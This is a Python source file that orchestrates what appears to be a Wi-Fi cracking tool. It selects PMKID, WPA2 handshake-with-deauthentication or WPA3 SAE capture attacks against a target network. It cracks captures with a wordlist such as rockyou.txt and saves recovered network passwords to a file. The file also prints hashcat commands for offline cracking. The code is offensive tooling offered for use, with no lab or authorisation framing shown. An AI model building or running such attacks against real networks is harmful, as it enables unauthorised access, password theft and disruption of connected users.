"""
core/attack.py - Attack orchestration
Routes to correct attack module based on target encryption
"""

from utils.logger import Logger
from utils.wordlist import resolve_wordlist
from attacks.wpa2 import WPA2Attack
from attacks.pmkid import PMKIDAttack
from attacks.wpa3 import WPA3Attack

log = Logger()


class AttackOrchestrator:
    def __init__(self, interface, target, attack_type="all",
                 wordlist=None, output_dir="./captures", deauth_count=5):
        self.interface = interface
        self.target = target
        self.attack_type = attack_type
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.deauth_count = deauth_count

    def run(self):
        """Run appropriate attack(s) based on target and user preference"""
        enc = self.target.get("attack_type", "wpa2")

        log.info(f"\nTarget: {self.target['essid']} | {self.target['bssid']} | "
                 f"CH {self.target['channel']} | {self.target['enc']}")

        # Resolve wordlist: auto-detect rockyou.txt if nothing was supplied
        self.wordlist = resolve_wordlist(self.wordlist)

        if enc == "open":
            log.warn("Network is open (no encryption). Nothing to crack.")
            return

        if enc == "wep":
            log.warn("WEP detected — legacy encryption, easily broken.")
            log.info("WEP attack not implemented (too trivial). Use aircrack-ng directly.")
            return

        # Build attack queue
        attacks = self._build_attack_queue(enc)

        for attack_cls, name in attacks:
            log.info(f"\n[*] Trying: {name}")
            attack = attack_cls(
                interface=self.interface,
                target=self.target,
                wordlist=self.wordlist,
                output_dir=self.output_dir,
                deauth_count=self.deauth_count
            )

            result = attack.run()

            if result and result.get("cracked"):
                log.success(f"\n[+] PASSWORD FOUND: {result['password']}")
                log.success(f"[+] Network: {self.target['essid']}")
                log.success(f"[+] Attack: {name}")
                self._save_result(result)
                return True

            elif result and result.get("captured"):
                log.info(f"[+] Handshake captured: {result['capfile']}")
                if self.wordlist:
                    cracked = attack.crack(result["capfile"])
                    if cracked:
                        log.success(f"\n[+] PASSWORD FOUND: {cracked}")
                        self._save_result({"password": cracked, "attack": name})
                        return True
                    else:
                        # BUG 4 FIX: crack() returned None — give specific feedback
                        # instead of falling through to the generic "All attacks exhausted"
                        log.warn("[!] Cracking complete — password not in wordlist.")
                        log.info(f"[*] Capture saved: {result['capfile']}")
                        log.info(f"[*] Try a bigger wordlist:")
                        log.info(f"    hashcat -m 22000 {result['capfile']} /usr/share/wordlists/rockyou.txt")
                        log.info(f"    hashcat -m 22000 {result['capfile']} <custom_wordlist> -r best64.rule")
                else:
                    log.warn("[!] No wordlist available. Capture saved for manual cracking.")
                    log.info(f"[*] Run: hashcat -m 22000 {result['capfile']} /usr/share/wordlists/rockyou.txt")


            else:
                log.warn(f"[-] {name} failed or timed out")

        log.warn("\n[-] All attacks exhausted. Target not cracked.")
        return False

    def _build_attack_queue(self, enc):
        """Build ordered attack queue based on encryption type and user preference"""
        wpa2_attacks = [
            (PMKIDAttack, "PMKID (clientless, modern)"),
            (WPA2Attack, "WPA2 Handshake + Deauth"),
        ]

        wpa3_attacks = [
            (WPA3Attack, "WPA3 SAE Handshake"),
            (PMKIDAttack, "PMKID (fallback)"),
        ]

        if self.attack_type == "pmkid":
            return [(PMKIDAttack, "PMKID")]
        elif self.attack_type == "wpa2":
            return [(WPA2Attack, "WPA2 Handshake")]
        elif self.attack_type == "wpa3":
            return wpa3_attacks
        else:  # all
            if enc == "wpa3":
                return wpa3_attacks
            else:
                return wpa2_attacks

    def _save_result(self, result):
        """Save cracked password to file"""
        import os
        outfile = os.path.join(self.output_dir, "cracked.txt")
        with open(outfile, "a") as f:
            f.write(
                f"ESSID: {self.target['essid']} | "
                f"BSSID: {self.target['bssid']} | "
                f"PASSWORD: {result.get('password', 'unknown')} | "
                f"ATTACK: {result.get('attack', 'unknown')}\n"
            )
        log.info(f"[+] Result saved to {outfile}")
